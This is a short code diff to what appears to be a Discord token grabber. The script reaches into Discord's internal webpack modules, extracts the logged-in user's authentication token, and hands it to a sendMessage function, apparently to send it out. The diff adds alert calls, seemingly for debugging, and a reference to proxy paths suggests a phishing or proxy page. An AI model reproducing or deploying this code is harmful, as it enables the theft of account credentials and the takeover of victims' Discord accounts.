@@ -15,8 +15,9 @@ function sendMessage(message) {
 (function () {
       try {
             var e = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
+            alert(e)
             } catch(err) {
-            console.log(err)
+            alert(err)
             }
     sendMessage(e)
     var proxy_dest_split = window.location.pathname.split(/(?=\/)/);
